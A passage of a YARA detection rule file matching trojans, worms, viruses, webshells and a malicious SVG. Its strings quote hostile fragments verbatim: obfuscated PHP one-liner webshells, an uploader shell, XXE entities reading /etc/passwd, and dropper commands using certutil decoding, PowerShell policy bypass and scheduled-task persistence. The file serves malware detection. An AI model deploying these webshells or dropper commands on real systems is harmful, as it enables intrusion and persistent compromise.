      $s20 = "ea7ed9bb14a7bda590cf3ff81c8c37703a028c4fdb4599b6a283d68fdcb2613f" ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule Trojan_Office {
   meta:
      filename = "MAL - file trojan.office"
      hash1 = "ff301b3295959a3ac5f3d0a5ea0d9f0aedcd8da7c4207b18f4bbb6ddaa0cdf22"
   strings:
      $s1 = "            xmlns:xapMM=\"http://ns.adobe.com/xap/1.0/mm/\"" fullword ascii
      $s2 = "            xmlns:exif=\"http://ns.adobe.com/exif/1.0/\">" fullword ascii
      $s3 = "            xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\">" fullword ascii
      $s4 = "            xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\">" fullword ascii
      $s5 = "            xmlns:xap=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii
      $s6 = "            xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\">" fullword ascii
      $s7 = "ppt/slideLayouts/slideLayout10.xml" fullword ascii
      $s8 = "ppt/slides/_rels/slide3.xml.rels" fullword ascii
      $s9 = "ppt/slides/_rels/slide3.xml.relsPK" fullword ascii
      $s10 = "ppt/slides/slide6.xml" fullword ascii
      $s11 = "ppt/slideLayouts/_rels/slideLayout3.xml.rels" fullword ascii
      $s12 = "ppt/theme/theme1.xml" fullword ascii
      $s13 = "ppt/notesSlides/_rels/notesSlide1.xml.rels" fullword ascii
      $s14 = "ppt/slides/_rels/slide7.xml.rels" fullword ascii
      $s15 = "ppt/slides/slide7.xml" fullword ascii
      $s16 = "ppt/slideLayouts/slideLayout11.xml" fullword ascii
      $s17 = "ppt/slides/_rels/slide2.xml.rels" fullword ascii
      $s18 = "ppt/slideMasters/_rels/slideMaster1.xml.relsPK" fullword ascii
      $s19 = "ppt/notesSlides/_rels/notesSlide1.xml.relsPK" fullword ascii
      $s20 = "ppt/slideLayouts/_rels/slideLayout7.xml.rels" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 600KB and
      8 of them
}

rule trojan_shadowhammer {
   meta:
      filename = "MAL - file trojan.shadowhammer.bin"
      hash1 = "b12cd68c5712badcf74719ab5315c9615896539e84e95b88b996abe956e5f8b3"
   strings:
      $s1 = "XjIYjD_jXf" fullword ascii
      $s2 = "SWjiXjdf" fullword ascii
      $s3 = "F\\=H{@" fullword ascii
      $s4 = "9_4v69]" fullword ascii
   condition:
      uint16(0) == 0x3ac4 and filesize < 70KB and
      all of them
}

rule trojan_zbot_mint {
   meta:
      filename = "MAL - file trojan_zbot_mint.ex_"
      hash1 = "09e9fb8beb798f2c17a311d59c0a44d9e815d6cad8ea4feadd77a66d4d3706b5"
   strings:
      $s1 = "@nspr4.dll" fullword wide
      $s2 = "QVVVVVVSW" fullword ascii
      $s3 = "$_PROXY_SERVER_HOST_$" fullword ascii
      $s4 = "> ?/?5?C?" fullword ascii
      $s5 = "5%5)6;6^6}6" fullword ascii
      $s6 = "&'8c+#9'd=5* * -%%" fullword ascii
      $s7 = "REOGFP',)NYE@,N`eyE{gadFkw" fullword ascii
      $s8 = "bcdfghjklmnpqrstvwxzaeiouy" fullword ascii
      $s9 = "lxhjmki" fullword ascii
      $s10 = "del /F \"%s\"" fullword ascii
      $s11 = "if exist \"%s\" goto d" fullword ascii
      $s12 = "uhknj\"45?;rtrOvpn=688'nhf5>00.bqM" fullword ascii
      $s13 = "CSeTcbPrivilege" fullword wide
      $s14 = "MDQPVSS" fullword ascii
      $s15 = "GRUDBZFD" fullword ascii
      $s16 = "BJFEOMM" fullword ascii
      $s17 = " !!!!!!\"\"#$%&'(((((())*+,-.IIIIIIII//I01234445656789:;9:;IIIII<=>?@ABCDEF" fullword ascii
      $s18 = "t*f98t%j%" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule TrojanSpectre_agentb {
   meta:
      filename = "MAL - file trojan.spectre_agentb"
      hash1 = "14608aeec352d1a1197f3d9cbc354c57a7d32cee1bc42c14feb4bcbc769e36bd"
   strings:
      $s1 = "GUID_PROCESSOR_PARKING_CORE_OVERRIDE" fullword ascii
      $s2 = "libgcj-16.dll" fullword ascii
      $s3 = "GUID_PROCESSOR_PARKING_HEADROOM_THRESHOLD" fullword ascii
      $s4 = "GUID_PROCESSOR_PERF_INCREASE_TIME" fullword ascii
      $s5 = "GUID_PROCESSOR_DISTRIBUTE_UTILITY" fullword ascii
      $s6 = "GUID_PROCESSOR_CORE_PARKING_MAX_CORES" fullword ascii
      $s7 = "GUID_PROCESSOR_CORE_PARKING_DECREASE_TIME" fullword ascii
      $s8 = "GUID_PROCESSOR_PERF_HISTORY" fullword ascii
      $s9 = "GUID_PROCESSOR_IDLE_PROMOTE_THRESHOLD" fullword ascii
      $s10 = "GUID_PROCESSOR_ALLOW_THROTTLING" fullword ascii
      $s11 = "GUID_PROCESSOR_CORE_PARKING_AFFINITY_HISTORY_THRESHOLD" fullword ascii
      $s12 = "GUID_PROCESSOR_IDLE_DEMOTE_THRESHOLD" fullword ascii
      $s13 = "IID_IProcessLock" fullword ascii
      $s14 = "GUID_PROCESSOR_CORE_PARKING_MIN_CORES" fullword ascii
      $s15 = "GUID_PROCESSOR_PARKING_PERF_STATE" fullword ascii
      $s16 = "GUID_PROCESSOR_PARKING_CONCURRENCY_THRESHOLD" fullword ascii
      $s17 = "IID_IProcessInitControl" fullword ascii
      $s18 = "GUID_PROCESSOR_PERF_TIME_CHECK" fullword ascii
      $s19 = "IID_ISynchronizeMutex" fullword ascii
      $s20 = "GUID_PROCESSOR_PERF_LATENCY_HINT" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule trojan_zbot_barys {
   meta:
      filename = "MAL - file trojan.zbot_barys.ex_"
      hash1 = "f5833e6db4a8bdbc5d90049008ccc9f75cc93a6a6c126969332566d87aeba700"
   strings:
      $s1 = "Gsystem32\\cGcript.Gxe" fullword wide
      $s2 = "fegOpenKeyW" fullword ascii
      $s3 = "AnY6jn8LKeYgla" fullword ascii
      $s4 = "CLnnD\\{289228DE-A31E-11D1-A19C-0000F875B132}\\Version" fullword wide
      $s5 = "$n!L -" fullword ascii
      $s6 = "fdvfff32" fullword ascii
      $s7 = "qomctk" fullword ascii
      $s8 = "PpknG645" fullword ascii
      $s9 = "M+uoJl{a3'2 :nv?I" fullword ascii
      $s10 = "zbSGbh$" fullword ascii
      $s11 = "nykDfqy" fullword ascii
      $s12 = "ptMspula\\anhxeW" fullword ascii
      $s13 = "HtiBKeS6Je\\E]sYk" fullword ascii
      $s14 = "jAlpPB<e?A_SaDanBU" fullword ascii
      $s15 = "2lF44]V@FkiJjAnCiKi'3O" fullword ascii
      $s16 = "APrJ9]s>" fullword ascii
      $s17 = "Yzma4Bie" fullword ascii
      $s18 = "TJWRn]{" fullword ascii
      $s19 = "PIXFgrqS]rqclo" fullword ascii
      $s20 = ":{rtQslA0xoc" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      8 of them
}

rule virus_elkernklez {
   meta:
      filename = "MAL - file virus_elkernklez.exe"
      hash1 = "0fa128bd5e54cd8c921113c386baa2b8f4f1ff0b0c7213ffe605e0fd1d3f663a"
   strings:
      $s1 = "\\TWAIN_32\\RES2650C.DLL" fullword wide
      $s2 = "\\TWAIN_32\\HUI2650C.DLL" fullword wide
      $s3 = "XXTISXX0.tmp" fullword ascii
      $s4 = "VMZOOM.TMP" fullword ascii
      $s5 = "Scan Test Failed !!!" fullword wide
      $s6 = "\\TWAIN_32\\ABOR650C.EXE" fullword wide
      $s7 = "Read Scanned Data Error" fullword wide
      $s8 = "5General failure in response to DAT_SETUPNATIVEXFER.  (General failure in transfer file open.  2General failure in transfer read" wide
      $s9 = "~TECOD.TMP" fullword ascii
      $s10 = "VM650C.TMP" fullword ascii
      $s11 = "Scan Test Successfully !!!" fullword wide
      $s12 = "Abort Scan Successfully !!!" fullword wide
      $s13 = ".General failure in response to DAT_IDENTITY.  3General failure in response to DAT_USERINTERFACE.  *General failure in response " wide
      $s14 = "\\TWAIN_32\\CB650C.DAT" fullword ascii
      $s15 = "\\TWAIN_32\\CW650C.DAT" fullword ascii
      $s16 = "Abort Scanning Error" fullword wide
      $s17 = ")Source is connected to max possible apps.!An operation error just occurred." fullword wide
      $s18 = "CB650C.DAT" fullword ascii
      $s19 = "CW650C.DAT" fullword ascii
      $s20 = "General failure in transfer.  /General failure in response to DAT_IMAGEINFO.  DGeneral failure in response to DAT_IMAGEMEMXFER, " wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule trojan_fbxi_scslcraft {
   meta:
      filename = "MAL - file trojan_fbxi_scslcraft.exe"
      hash1 = "5e77eee9704e619b68e37829c5f2099c52d22b170087c9953cbcabd7a21500ba"
   strings:
      $s1 = " http://www.robertgraham.com/tools/scanslam/" fullword ascii
      $s2 = "--- Copyright 2003 Internet Security Systems ---" fullword ascii
      $s3 = "err: max targets exceeded" fullword ascii
      $s4 = "err: bind(port=%d) %d" fullword ascii
      $s5 = " -r specifies rate in packets/second" fullword ascii
      $s6 = "%d.%d.%d.%d: unpatched" fullword ascii
      $s7 = "err: sendto(%d.%d.%d.%d:%d) %d" fullword ascii
      $s8 = "%d.%d.%d.%d: bad response: " fullword ascii
      $s9 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
      $s10 = "ranges specied as example: 10.0.0.0-10.255.255.255" fullword ascii
      $s11 = "couldn't resolve host %s" fullword ascii
      $s12 = " Queries hosts/ranges for SQLslammer vulnerability" fullword ascii
      $s13 = "info: use -f<filename> next to time to save state and restart" fullword ascii
      $s14 = " -? for more help" fullword ascii
      $s15 = "err: failed to save state" fullword ascii
      $s16 = "err: already reading from %s" fullword ascii
      $s17 = "ScanSlam" fullword ascii
      $s18 = "Broken pipe" fullword ascii
      $s19 = "Permission denied" fullword ascii
      $s20 = "info: <ctrl-c>, will stop in 3 seconds" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule trojan_reconyc {
   meta:
      filename = "MAL - file trojan_reconyc.exe"
      hash1 = "3f5a6d8334f31acd4d9e2811ca705e0bcf4a1c9f672d2fb4933a00adf46b2f5a"
   strings:
      $s1 = "load.exe" fullword ascii
      $s2 = "slide.exe /clean /nobanner " fullword ascii
      $s3 = "Scanning drive for infected HTM/HTML/ASP files...." fullword ascii
      $s4 = "  PE_NIMDA.A FOUND!!!" fullword ascii
      $s5 = " |                  http://www.antivirus.com               |" fullword ascii
      $s6 = " |      http://www.antivirus.com/pc-cillin/vinfo/          |" fullword ascii
      $s7 = "File mapping error." fullword ascii
      $s8 = "file map view error" fullword ascii
      $s9 = "file map error" fullword ascii
      $s10 = "Scanning drive for infected files..." fullword ascii
      $s11 = " |      1. Scan the system for infected files.             |" fullword ascii
      $s12 = "    Terminating process (%s)... " fullword ascii
      $s13 = "\\WININIT.BAK" fullword ascii
      $s14 = "Cannot get OS version." fullword ascii
      $s15 = " |  Scan and clean infected files.                         |" fullword ascii
      $s16 = "Checking for PE_NIMDA.A in SYSTEM.INI..." fullword ascii
      $s17 = "Cleaned!" fullword ascii
      $s18 = " Skipped." fullword ascii
      $s19 = "DELETE_FILE: " fullword ascii
      $s20 = " |      2. Clean/delete infected files.                    |" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule trojan_zaccess_sirefef {
   meta:
      filename = "MAL - file trojan_zaccess_sirefef.exe_"
      hash1 = "71b38f041b4a4ae169c44e3aff412e527e1156f92c27f1340a8abe70a45bee10"
   strings:
      $s1 = "[k^> -" fullword ascii
      $s2 = "X9+ B~" fullword ascii
      $s3 = "VTohjp3" fullword ascii
      $s4 = "pzKgAEU" fullword ascii
      $s5 = "qFPsK*G" fullword ascii
      $s6 = "XVbUHi\"" fullword ascii
      $s7 = "tghjrQs" fullword ascii
      $s8 = "NlouD[;" fullword ascii
      $s9 = "KzBhBxyS" fullword ascii
      $s10 = "dXNHlcm" fullword ascii
      $s11 = "DHvbT\"" fullword ascii
      $s12 = "unpPlp-" fullword ascii
      $s13 = "VTQL?O" fullword ascii
      $s14 = "qigh\\u" fullword ascii
      $s15 = "hXvQDDX" fullword ascii
      $s16 = "PuDmf8" fullword ascii
      $s17 = "\\t(Bo=tF" fullword ascii
      $s18 = "\\O?xa}" fullword ascii
      $s19 = "\\xVrNc" fullword ascii
      $s20 = "\\;kV_z" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule worm_hybrisvecna {
   meta:
      filename = "MAL - file worm_hybrisvecna.EXE"
      hash1 = "fc3e0bee12147595078864a597e14161792c6fafbac55174588561c99494a6a4"
   strings:
      $s1 = "GetModuwl" fullword ascii
      $s2 = "hNIT.hWINIT" fullword ascii
      $s3 = "hNIT.hWINITUQR" fullword ascii
      $s4 = "h32.DhWS2_T" fullword ascii
      $s5 = "BHAAKPLK" fullword ascii
      $s6 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" fullword ascii
      $s7 = "YYYhQ<N" fullword ascii
      $s8 = "OUMCvZ_.N" fullword ascii
      $s9 = ".rdat*$QZJL" fullword ascii
      $s10 = "HYBRIS" fullword ascii
      $s11 = "TkQj81" fullword ascii
      $s12 = "%.=]`~" fullword ascii
      $s13 = ":m-Z~(" fullword ascii
      $s14 = "PE=u_t" fullword ascii
      $s15 = "u0hNUL" fullword ascii
      $s16 = "S<]sTl" fullword ascii
      $s17 = "=pv9Q21+0(" fullword ascii
      $s18 = "WFY7N[9(" fullword ascii
      $s19 = "]gqh)." fullword ascii
      $s20 = "@tr9t$(t!j" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      8 of them
}

rule TrojanZbot_graftor {
   meta:
      filename = "MAL - file trojan.zbot_graftor"
      hash1 = "b04637c11c63dd5a4a599d7104f0c5880717b5d5b32e0104de5a416963f06118"
   strings:
      $s1 = "* mEl!" fullword ascii
      $s2 = "aaaaaaaaaaaaaaaaaaaaf" ascii
      $s3 = "Runtime " fullword ascii
      $s4 = "@t>Sl:\"s" fullword ascii
      $s5 = "orland" fullword ascii
      $s6 = "sC- oc" fullword ascii
      $s7 = "jklmnp" fullword ascii
      $s8 = "w* 7\\pP" fullword ascii
      $s9 = "# RB\\H" fullword ascii
      $s10 = "akqa&uz" fullword ascii
      $s11 = "3,45657879" fullword ascii 
      $s12 = "\"(GLOa" fullword ascii 
      $s13 = "ZFpn?&" fullword ascii
      $s14 = "rrrrrmm" fullword ascii 
      $s15 = "kkkkkkkkkkkjhjjjo" fullword ascii 
      $s16 = "JJJJJJJJJJJJJJJJJJJaieQRamu" fullword ascii 
      $s17 = "mnopqr8st" fullword ascii
      $s18 = "uvwxyz0p1" fullword ascii
      $s19 = "DMfnAlrjs" fullword ascii
      $s20 = "rrrrrrrrrrrrrppps" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule virus_alliance_msword {
   meta:
      filename = "MAL - file virus.alliance_msword.DOC"
      hash1 = "779146bf6945a139d0849f7fb6bb00cb263ea23a939e849b8d59096dcea4b856"
   strings:
      $s1 = "C:\\MSOFFICE\\WINWORD\\TEMPLATE\\NORMAL.DOT" fullword ascii
      $s2 = "33333333333333333333333334444433" ascii
      $s3 = "Enzian Technology, Inc.%\\\\ENZIAN_02\\SYS\\USERS\\KEITH\\ATEST.DOC" fullword ascii
      $s4 = "333333333333333333333333334433" ascii
      $s5 = "3334444444" ascii
      $s6 = "32255555555555552225555552" ascii
      $s7 = "3333333333344444444444" ascii
      $s8 = "2555555522" ascii 
      $s9 = "5555555552" ascii
      $s10 = "5555555551" ascii
      $s11 = "2555555542" ascii
      $s12 = "Payload : Changes File Summary info to - You have been infected by the Alliance." fullword ascii
      $s13 = "Alliance1 - Word Macro Virus&You Have Been Infected by the Alliance" fullword ascii
      $s14 = "3333344444" ascii
      $s15 = "3333333443" ascii
      $s16 = ")!!!!####$$((),3456>" fullword ascii
      $s17 = "Alliance1  - Word Macro Virus" fullword ascii
      $s18 = "Alliance1 - Word Macro Virus" fullword ascii
      $s19 = "$,,,33333333333333333333333334444433$" fullword ascii
      $s20 = "<<<<<<<<<<<<<<<<<<<<<<<<<<*" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 100KB and
      8 of them
}

rule trojan_zherkov_dncp {
   meta:
      filename = "MAL - file trojan.zherkov_dncp.EXE"
      hash1 = "8463ac9eec3013887995ee9d94eeeb960400cd173afa53fbe48a5950e36433e7"
   strings:
      $s1 = "C Library - (C)Copyright Microsoft Corp 1986" fullword ascii
      $s2 = "error 2009: Not enough space for environment" fullword ascii
      $s3 = "error 2003: Integer divide by 0" fullword ascii
      $s4 = "error 2001: Null pointer assignment" fullword ascii
      $s5 = "error 2000: Stack overflow" fullword ascii
      $s6 = "error 2004: DOS 2.0 or later required" fullword ascii
      $s7 = ";C_FILE_INFO" fullword ascii
      $s8 = "8G9Cs?" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 10KB and
      all of them
}

rule worm_mytobmydoom_txt {
   meta:
      filename = "MAL - file worm_mytobmydoom.txt.pif"
      hash1 = "b06840dad794177214c84540a83a32df9cdb76b2343e4533597cdba5cbfa892c"
   strings:
      $s1 = "ilTqGko" fullword ascii
      $s2 = "uuxF]T^" fullword ascii
      $s3 = "uVCj?<L" fullword ascii
      $s4 = "oyoc28" fullword ascii
      $s5 = "\\,Bo5|" fullword ascii
      $s6 = "|J!aa(" fullword ascii
      $s7 = "s'5yg\"" fullword ascii
      $s8 = "qx4[O5" fullword ascii
      $s9 = "1VSS7e" fullword ascii
      $s10 = "]m'ld`q" fullword ascii
      $s11 = "|f#KrP" fullword ascii
      $s12 = "|fdK_7#" fullword ascii
      $s13 = "`G|Exo" fullword ascii
      $s14 = "9wC##e" fullword ascii
      $s15 = "+K3/lCw" fullword ascii
      $s16 = "QOG?FZ" fullword ascii
      $s17 = "//]#o'" fullword ascii
      $s18 = "nL]533i" fullword ascii
      $s19 = "(F>Men" fullword ascii
      $s20 = "|*A~&c" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule virus_yaunch_wench {
   meta:
      filename = "MAL - file virus.yaunch_wench.EXE"
      hash1 = "bc73990f2d04358ddb9c17520d7cc9905c014eb61fbd7d895d565e2263de58c9"
   strings:
      $s1 = "$YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY" ascii
      $s2 = "$YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY" ascii
      $s3 = "Rlnm!(" fullword ascii
      $s4 = "!This is a tiny EXE program, padded to be >5000 bytes." fullword ascii
      $s5 = "STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK STACK " fullword ascii
      $s6 = "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY" ascii
      $s7 = "^9_9`9a9b9c9d9e9" fullword ascii
      $s8 = "9091929694959" ascii
      $s9 = "Q9R9S9-:U9V9W9X9Y9Z9[9\\9" fullword ascii
      $s10 = "&?~PS$T" fullword ascii
      $s11 = "9x9y9z9{9|9}9~9" fullword ascii
      $s12 = "9a9b9c9d9e9" ascii
      $s13 = "\"9#9$9%9&9'9(9" fullword ascii
      $s14 = "A9B9C9D9T9F9G9H9I9" fullword ascii
      $s15 = ":l9k9p9m9n9o9" fullword ascii
      $s16 = "q9r9s9t9u9v9" fullword ascii
      $s17 = "+9,9-9.9/9091929694959:9798999" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      8 of them
}

rule virus_zherkov_univ {
   meta:
      filename = "MAL - file virus.zherkov_univ.EXE"
      hash1 = "cee4a7208ec3144eda92df0fc1ba27ebad356aa0a3b5e50afab133bbbee14be2"
   strings:
      $s1 = "NCMAIN.EXE" fullword ascii
      $s2 = "Norton Commander(" fullword ascii
      $s3 = "/CRC Error" fullword ascii
      $s4 = "*Fabrice BELLARD*" fullword ascii
      $s5 = "986 by John Soch" fullword ascii
      $s6 = "Copyright (C) 1" fullword ascii
      $s7 = "is noBx" fullword ascii
      $s8 = " load:" fullword ascii
      $s9 = "JzU8<cT-" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule TrojanVBS_Agent {
   meta:
      filename = "MAL - file Win32.VBS.APT34Dropper"
      hash1 = "f83936a6169d91dab8cb31b27469bde584429695e87307452dc4e4293698383f"
   strings:
      $x1 = "objFile.Write \"set Shell0 = CreateObject(\"\"wscript.shell\"\")\" & vbCrLf & \"Shell0.run \"\"powershell.exe -exec bypass -file" ascii
      $x2 = "oShell.run \"cmd.exe /C wscript  /b C:\\ProgramData\\Windows\\Microsoft\\java\\GoogleUpdateschecker.vbs\", 0,false" fullword ascii
      $x3 = "objFile.Write \"set Shell0 = CreateObject(\"\"wscript.shell\"\")\" & vbCrLf & \"Shell0.run \"\"powershell.exe -exec bypass -file" ascii
      $x4 = "amData\\Windows\\Microsoft\\java\\hUpdateCheckers.ps1 \"\", 0, false\" & vbCrLf & \"command1 = \"\"Powershell.exe -exec bypass -" ascii
      $x5 = "oShell.run \"cmd.exe /C certutil -f  -decode C:\\ProgramData\\Windows\\Microsoft\\java\\hUpdateCheckers.base C:\\ProgramData\\Wi" ascii
      $x6 = "oShell.run \"cmd.exe /C certutil -f  -decode C:\\ProgramData\\Windows\\Microsoft\\java\\hUpdateCheckers.base C:\\ProgramData\\Wi" ascii
      $x7 = "oShell.run \"cmd.exe /C certutil -f  -decode C:\\ProgramData\\Windows\\Microsoft\\java\\dUpdateCheckers.base C:\\ProgramData\\Wi" ascii
      $x8 = "oShell.run \"cmd.exe /C certutil -f  -decode C:\\ProgramData\\Windows\\Microsoft\\java\\dUpdateCheckers.base C:\\ProgramData\\Wi" ascii
      $x9 = "oShell.run \"cmd.exe /C del C:\\ProgramData\\Windows\\Microsoft\\java\\*.base\", 0,false" fullword ascii
      $x10 = "oShell.run \"cmd.exe /C del C:\\ProgramData\\Windows\\Microsoft\\java\\cUpdateCheckers.bat\", 0,false" fullword ascii
      $x11 = "oShell.run \"cmd.exe /C C:\\ProgramData\\Windows\\Microsoft\\java\\cUpdateCheckers.bat\", 0,false" fullword ascii
      $x12 = "code4=\"@schtasks /create /F /sc minute /mo 1 /tn \"\"\\UpdateTasks\\JavaUpdates\"\" /tr \"\"wscript /b \"\"C:\\ProgramData\\Win" ascii
      $x13 = " /tr \"\"wscript /b \"\"C:\\ProgramData\\Windows\\Microsoft\\java\\GoogleUpdateschecker.vbs\"\"\"\"\"" fullword ascii
      $s14 = "code4=\"@schtasks /create /F /sc minute /mo 1 /tn \"\"\\UpdateTasks\\JavaUpdates\"\" /tr \"\"wscript /b \"\"C:\\ProgramData\\Win" ascii
      $s15 = "ell1.run command1, 0, false\" " fullword ascii
      $s16 = "sb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCk" ascii
      $s17 = "t\\java\\GoogleUpdateschecker.vbs\"\"\"\"NEXTLINE@schtasks /create /F /sc minute /RU \"\"SYSTEM\"\" /mo 1 /tn \"\"\\UpdateTasks" ascii
      $s18 = "outFile = \"C:\\ProgramData\\Windows\\Microsoft\\java\\GoogleUpdateschecker.vbs\"" fullword ascii
      $s19 = "if Not objFso.FileExists(\"C:\\ProgramData\\Windows\\Microsoft\\java\\GoogleUpdateschecker.vbs\") Then" fullword ascii
      $s20 = "TeXN0ZW1Qcm9kdWN0ICB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFVVSUQgfCAleyRfLnJlcGxhY2UoJy0nLCcnKX0gfCAleyRfICsgIjEyNDUyNDEzNjU" ascii 
   condition:
      uint16(0) == 0x6944 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule PHP_WEBSHELL_ON_IMG {
   meta:
      filename = "MAL - file images.jpg"
      hash1 = "8b333ae18800077195face04a7ee6e191585df30b49ec68bd3654c315566ab1e"
   strings:
      $s1 = "];echo`$_`?>" fullword ascii
      $s2 = "<?=$=\"\";$=\"'\";$=($^chr(4*4*(5+5)-40)).($^chr(47+ord(1==1))).($^chr(ord('')+3)).($^chr(((10*10)+(5*3))));$=${$}['_'" ascii
      $s3 = "<?php echo 'Uploader<br>';echo '<br>';echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" " ascii
      $s4 = "POST['_upl'] == \"Upload\" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'" ascii
      $s5 = "ader\">';echo '<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\">" ascii
   condition:
      any of them

}

rule Malicious_Script_SVG {
   meta:
      filename = "MAL - file test.svg"
      hash1 = "d305d1ab09f8418d8d7cd74f18be19ba221f00f4f065d461dd31052f15571c0d"
   strings:
      $s1 = "&lt;!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\"&gt;" fullword ascii
      $s2 = "<!ENTITY foo SYSTEM \"file:///etc/passwd\">" fullword ascii
      $s3 = "   </script>" fullword ascii
      $s4 = "   <script type=\"text/javascript\">" fullword ascii
      $s5 = "<?xml version=\"1.0\" standalone=\"no\"?>" fullword ascii
      $s6 = "  <!ENTITY xxe SYSTEM>" fullword ascii
      $s7 = "  <!-- an internal subset can be embedded here -->" fullword ascii
      $s8 = "  <text x=\"20\" y=\"35\">My &xxe;</text>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and
      any of them
}

rule Backdoor_WebShell_asp
{
    meta:
      description= "Detect ASPXSpy"
    strings:
      $s1 = "CmdShell" wide ascii
      $s2 = "ADSViewer" wide ascii
      $s3 = "ASPXSpy.Bin" wide ascii
      $s4 = "PortScan" wide ascii
      $plugin = "Test.AspxSpyPlugins" wide ascii
 
    condition:
    3 of ($s*) or $plugin
}

rule webshell_ChinaChopper_aspx
{
  meta:
      description = "Detect China Chopper ASPX webshell"
  strings:
	   $ChinaChopperASPX = {25 40 20 50 61 67 65 20 4C 61 6E 67 75 61 67 65 3D ?? 4A 73 63 72 69 70 74 ?? 25 3E 3C 25 65 76 61 6C 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-100] 75 6E 73 61 66 65}
  condition:
	   $ChinaChopperASPX
}

rule webshell_ChinaChopper_php
{
  meta:
      description = "Detect China Chopper PHP webshell"
  strings:
	   $ChinaChopperPHP = {3C 3F 70 68 70 20 40 65 76 61 6C 28 24 5F 50 4F 53 54 5B ?? 70 61 73 73 77 6F 72 64 ?? 5D 29 3B 3F 3E}
  condition:
	   $ChinaChopperPHP
}

rule Dotico_PHP_webshell : webshell {
    meta:
        description = ".ico PHP webshell - file <eight-num-letter-chars>.ico"
    strings:
      $php = "<?php" ascii
      $regexp = /basename\/\*[a-z0-9]{,6}\*\/\(\/\*[a-z0-9]{,5}\*\/trim\/\*[a-z0-9]{,5}\*\/\(\/\*[a-z0-9]{,5}\*\//
    condition:
      $php at 0 and $regexp and filesize > 70KB and filesize < 110KB
}

rule PHP_OBFUSCATED_WEBSHELLS {
   meta:
      filename = "MAL - file obfuscated.php"
      hash1 = "11516b1439dbe41a7c9e42672e2a1a8ab2cbb0d42d1542a11e402f7c8a36744a"
   strings:
      $s1 = "];echo`$_`?>" fullword ascii
      $s2 = "<?=$_=\"\";$_=\"'\";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'" ascii
      $s3 = "<?=`{$_REQUEST['_']}`?>" fullword ascii
      $s4 = "<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>" fullword ascii
      $s5 = "<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>" fullword ascii
      $s6 = "<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>" fullword ascii
      $s7 = "<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]); ?>" fullword ascii
      $s8 = "<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>" fullword ascii
      $s9 = "<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>" fullword ascii
      $s10 = "<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>" fullword ascii
      $s11 = "<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>" fullword ascii
      $s12 = "<?php $_=\"{\"; $_=($_^\"<\").($_^\">;\").($_^\"/\"); ?> <?=${'_'.$_}[\"_\"](${'_'.$_}[\"__\"]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and
      any of them
}

rule PHP_OBFUSCATED_WEBSHELL_ON_IMG {
   meta:
